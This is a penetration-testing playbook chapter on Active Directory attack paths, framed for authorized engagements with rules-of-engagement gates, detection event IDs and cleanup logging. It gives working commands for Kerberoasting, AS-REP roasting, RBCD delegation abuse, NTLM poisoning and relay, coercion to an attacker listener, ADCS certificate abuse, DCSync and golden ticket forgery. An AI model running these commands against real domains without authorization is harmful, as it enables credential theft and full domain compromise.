# 05 — Active Directory Attack Paths

**When to read:** At internal-network foothold (any domain-joined context); whenever BloodHound/PowerView data exists or needs collecting; any Kerberos/NTLM/LDAP attack decision; pre-domain-compromise planning and post-DA dominance.
**Prerequisites:** Domain user context (even lowest-privilege) OR relay/coercion capability; DC/LDAP reachability from foothold; tools staged per OPSEC posture (10).
**Primary ATT&CK mapping:** T1087 Account Discovery, T1069 Permission Groups Discovery, T1018 Remote System Discovery (enum); T1558 Steal or Forge Kerberos Tickets (T1558.003 Kerberoasting, T1558.004 AS-REP Roasting, T1558.001 Golden Ticket, T1558.002 Silver Ticket); T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay; T1187 Forced Authentication; T1484.002 Domain Trust Modification (RBCD-class); T1003.006 DCSync; T1550 Use Alternate Authentication Material.

## Concept map (30 seconds)

Domain = identity plane. Control plane = DCs (Kerberos KDC + LDAP + replication). Attack paths = chained misconfigurations (ACL abuse, delegation, credential exposure) ending at DA-equivalent. **BloodHound graph = the engagement's map**; every later phase (06/08/09) cites paths discovered here. Enumerate everything BEFORE choosing the first exploit — the shortest path is usually not the obvious one.

## Phase 1 — Enumeration

### Collection

```bash
# BloodHound CE (default): python collector from any domain context
bloodhound-python -d <domain> -u <user> -p <pass> -ns <dc-ip> -c All --zip
# On-host: SharpHound.ps1 (PowerShell) — EDR-visible (10 for posture)
# Manual/fallback (PowerView-class LDAP queries, or ldapsearch):
ldapdomaindump -u '<domain>\<user>' -p <pass> <dc-ip>          # HTML inventory
netexec smb <cidr> --users --groups --shares -u <user> -p <pass>
```

**OPSEC note:** SharpHound on-host = PowerShell/ETW telemetry (script-block logging if enabled). `bloodhound-python` from foothold network position = LDAP-only traffic (still fingerprintable by query patterns, but no process execution on a monitored host). Posture choice per RoE (00 EVASION class).

### High-yield queries (the 10 that find most paths)

1. **Kerberoastable accounts** (SPNs on user objects, non-DA service accounts with weak passwords — Phase 2).
2. **AS-REP no-preauth accounts** (userAccountControl `DONT_REQ_PREAUTH` = 0x40000000 / 4194304) — Phase 2.
3. **Unconstrained delegation** (TRUSTED_FOR_DELEGATION 0x80000 / 524288) — Phase 3.
4. **Constrained delegation / RBCD candidates** (msDS-AllowedToDelegateTo; GenericWrite/GenericAll over computer objects) — Phase 3.
5. **ACL abuse edges:** GenericAll/GenericWrite/WriteDacl/WriteOwner/AllExtendedRights over users/groups/computers; ForceChangePassword; AddMember chains.
6. **gMSA readable passwords** (group in msDS-GroupMSAMembership can read msDS-ManagedPassword → service account password): `gMSADumper -u <user> -p <pass> -d <domain> -l <dc>` or netexec gMSA module.
7. **LAPS-readable computers** (ms-Mcs-AdmPwd read rights — LAPS v1; newer msLAPS-EncryptedPassword): local-admin password per machine → lateral (08).
8. **Password-in-attributes:** user `description`/`info`/`comment` fields (classic `passw0rd!` left by admins) — LDAP filter `(&(objectClass=user)(description=*pass*))`.
9. **Group memberships that grant machines/users indirect power:** Account Operators, Print Operators (server operator on DCs), Backup Operators (→ SeBackupPrivilege on DC → 06), DnsAdmins (→ DC code exec via DLL load — needs explicit approval: DC-wide change), Hyper-V admins, Exchange groups (legacy Exchange = classic DC compromise chains).
10. **Trust map:** intra-forest child→parent (SID history path), external/forest trusts with selective authentication or TGT-delegation notes.

### Legacy quick wins (check before graph-chasing)

- **SYSVOL GPP cpassword** (T1552.006): `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml` → AES-encrypted password; the published MS-GPP key decrypts it. Finding = stored domain-wide local-admin password. (Modern domains: cpassword stripped — still test, report if present.)
- **Machine account Quotas:** default `MachineAccountQuota` (10) lets any domain user create computer accounts — prerequisite for RBCD attack (Phase 3); also itself a hardening finding.
- **Password in unattend.xml / image artifacts** on shares (findstr over share sweep from 02's netexec shares output).

## Phase 2 — Kerberos credential attacks (offline-crack class)

### Kerberoasting (T1558.003)

```bash
# from foothold (no on-host execution):
GetUserSPNs.py -dc-ip <dc-ip> -request <domain>/<user>:<pass> -outputfile kerb.txt
# on-host: Rubeus kerberoast /crestdump; hash format: $krb5tgs$23$...
hashcat -m 13100 kerb.txt <wordlist> -r rules/best64.txt   # RC4 (etype 23) — crackable
# AES tickets: 19900 (AES256) / 19800 (AES128) — much harder; etype depends on account's msDSSupportedEncryptionTypes
```

- **OPSEC:** requesting RC4 (etype 23) TGS for a user whose account supports AES = anomaly (4769 with RC4 downgrade); prefer AES-request if the account supports it and you have cracking power — RoE tradeoff note.
- Cracked service-account password → 08 (credential use). Report as finding (weak service password + Kerberoast exposure), with the account's actual privilege path from BloodHound.

### AS-REP Roasting (T1558.004)

```bash
GetNPUsers.py -dc-ip <dc-ip> -no-pass -usersfile users.txt <domain>/ -format hashcat
hashcat -m 18200 asrep.txt <wordlist>
```

Same crack-offline discipline; no-preauth accounts are themselves a finding (should have preauth on) even if password survives cracking.

## Phase 3 — Delegation attacks

| Type | Prerequisite | Attack chain |
|---|---|---|
| **Unconstrained** | Account with TRUSTED_FOR_DELEGATION (often DCs themselves + legacy servers) | Coerce authentication (PrinterBug/PetitPotam-class, see relay section) TO the unconstrained host → its memory holds the authenticating user's TGT (incl. a DA) → extract (08) → use |
| **Constrained (S4U)** | Service account with msDS-AllowedToDelegateTo | With S4U2self + S4U2proxy forge access to the delegated service as ANY user (incl. DA) — no password crack needed if you own the service account |
| **RBCD** | Write right (GenericWrite/GenericAll) over a TARGET computer object + ability to create a computer (MachineAccountQuota) or own an existing one | Create fake computer → set target's `msDS-AllowedToActOnBehalfOfOtherIdentity` to fake computer's SID → S4U2self/2proxy as a DA for that host → full host control (T1484.002-class) |

```bash
# RBCD chain (tools: impacket suite)
python3 rbcd.py -f FAKE01 -t TARGET01 -dc-ip <dc-ip> '<domain>/<user>:<pass>'   # set attribute
getST.py -spn cifs/TARGET01.<domain> -impersonate administrator '<domain>/FAKE01:FakePass'
# → use ticket (T1550.003) → psexec-class access to TARGET01 (08)
```

**Evidence note:** RBCD = a domain object modification — log the exact attribute write (LDAP timestamp + who) for revert in close-out (15). Domain-object changes are the class clients care most about being reversed cleanly.

## Phase 4 — Poisoning & relay (T1557.001 / T1187)

Prereq check from 02: SMB signing state (`netexec smb <cidr> --gen-relay-list` → targets where signing is False/None). LDAP relay targets: DCs without LDAP signing enforcement (default-config gap finding); ADCS HTTP endpoints (ESC8-class).

```bash
# LLMNR/NBT-NS poison + capture (Responder class)
responder -I <iface> -dwv                  # hashes captured → 08 (crack/relay)
# Relay engine
ntlmrelayx.py -tf relay-targets.txt -smb2support -socks        # SMB relay → SOCKS access
ntlmrelayx.py -tf <file> -wh <attacker-dns> --delegate-access # IPv6/WPAD path (mitm6 upstream)
# Coercion (forces a target to authenticate TO you — for unconstrained capture or relay feed)
python3 coercer.py -u <user> -p <pass> --target <ip> --listener <attacker-ip>   # printerbug/petitpotam/dfscoerce family
```

- **mitm6 path** (DHCPv6 + WPAD → LDAP relay to DC): relayed LDAP = create computer account / modify group ACLs / set RBCD on DC-class targets — the full chain is Phase 3 material with relay instead of a user context.
- **Detection honesty:** poisoning is the noisiest technique in the file (LLMNR floods on every query). RoE often allows it only in scoped windows. Log poison windows' exact time range (client timeline reconstruction, 15).
- Coercion against a DC = the DC authenticates to YOU — only under explicit RoE approval class (interacting with DC auth flow), never by accident.

## Phase 5 — ADCS (Certificate Services) attacks

```bash
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable -stdout   # ESC1–8 detection
```

| ESC | Condition (summary) | Chain |
|---|---|---|
| ESC1 | Low-priv user CAN enroll template + template allows SAN (supply any user in CSR) + manager approval off + authorized signatures not required | Cert as ANY user (incl. DA) → 08 cert-based auth |
| ESC2 | "Any Purpose" EKU template + enroll rights | Same as ESC1 with any-purpose cert |
| ESC3 | Enrollment-agent-certificate template | Cert that issues certs for others |
| ESC4 | Write access to template object | Rewrite template conditions → ESC1 conditions |
| ESC5 | ACL abuse on PKI objects (CA server/registry) | Various |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag (old) | SAN in any enrollment |
| ESC7 | CA-level manageCA rights (DangerousRights) | Configure new officers / template control |
| ESC8 | NTLM-relayable HTTP enrollment interfaces (default) | Relay coerced auth (Phase 4) → cert as that user |

Cert + private key (T1550-class material, .pfx) → cert auth as target user (Rubeus/`certipy auth`) → 08. **Every enrolled cert is an artifact: record issued cert serials for close-out revoke (15).**

## Phase 6 — Credential access quick reference (full detail in 08)

- LSASS dump → NTLM/AES keys (08) — needs host-level access (06).
- DCSync (T1003.006) once DA-equivalent (or replication-right holder): `secretsdump.py <domain>/<da>:@<dc-ip> -just-dc` → full domain credential set. **DCAUTION:** massive, high-visibility action; RoE usually requires explicit approval before DCSync (it pulls every hash in the domain = bulk-credential access, 00 data-minimal rule). Detection: 4662 replication ops.

## Phase 7 — Domain dominance (post-DA, RoE-gated per action)

- **Golden ticket (T1558.001):** forge TGTs with krbtgt AES/NTLM keys (from DCSync). RoE note: typically demonstrate ONCE with a canary account, never leave standing forgery capability undocumented.
- **Silver ticket (T1558.002):** service-key forged service tickets (cifs/host/mssqlsvc per service) — no DC interaction, stealthier.
- **Skeleton key:** DC in-memory patch accepting a magic password — **DC-wide memory modification: almost always prohibited without explicit approval; if approved, record install/remove times precisely.**
- **DSRM / DC local-admin persistence; AdminSDHolder backdoor (adds SD that re-grants on SDProp run — documented+reverted or not done); security-descriptor modifications on domain objects (DCSync-via-ACL backdoors) — same class: artifact-left inventory + close-out verification (15).**
- **Trust attacks:** intra-forest SID-history injection (T1484.002-class) for child→parent DA equivalence; cross-trust key attacks where trust flows allow. Mark every trust-class action as domain-infrastructure modification (highest review class).

## Common failures / misreads

| Symptom | Misread | Reality check |
|---|---|---|
| Kerberoast returns AES-only hashes | "No attack" | Crackable at higher cost; or use the account via other paths (constrained delegation ownership) |
| Relay "fails" with `STATUS_LOGON_FAILURE` | "Signing blocks it" | Signing blocks relay silently (`STATUS_NOT_SUPPORTED`-class); LOGON_FAILURE = bad creds or cross-domain mismatch — check target/local auth flag |
| BloodHound "no path to DA" | "Domain is clean" | Default edge set ≠ reality: uncollected sessions, ACLs requiring collection flags (-c All), session data stale — recollect; also check non-DA goals (Exchange/DNS/backup dominance) |
| ESC1 template found | "Instant DA" | Check CA actually issues it (template published on CA + manager approval state) — certipy `-vulnerable` marks templates, verify enrollment in a test run |
| gMSA password read fails | "Not misconfigured" | Check reader group membership of current user (msDS-GroupMSAMembership) — the dumper only works if you're actually in it |

## Detection footprint (what the DC logs see)

- 4769 TGS requests (Kerberoast — esp. RC4/etype 23 downgrade), 4768 AS-REQ anomalies for AS-REP-roasted accounts, 4662 for DCSync replication, 5136 for object modifications (RBCD attribute, template ESC4 edits), 4741 for computer-account creation (RBCD fake computer), 4768/4769 spikes from relay chains, CertificateServices 4886/4887-class enrollment events.
- Purple-team handoff: map each technique used to its detection event + coverage gaps — this table becomes the detection-engineering appendix (15).

## Tool fallback order

- Collection: bloodhound-python (network-only) > SharpHound (on-host, EDR-visible) > PowerView manual (targeted single queries).
- Kerberos: impacket (Rubeus-class on-host for ticket ops where needed).
- Relay: impacket ntlmrelayx + responder > custom coercion.
- ADCS: certipy > manual rpc/PKI tooling.
- LDAP ops: bloodyAD > ldapmodify raw (bloodyAD handles encoding for attribute writes like RBCD SID blobs).

## Evidence handoff

Per attack path exercised: path graph export (BloodHound path screenshot with named edges), each hop's command + output (00 evidence rules), the domain-object modification log (attribute, before/after value, timestamp — close-out revert list for 15), artifacts-left list (computer accounts created, certs enrolled, ACLs modified). All credential material → vault (00). Domain compromise timestamp = the report's headline metric (time-to-domain.
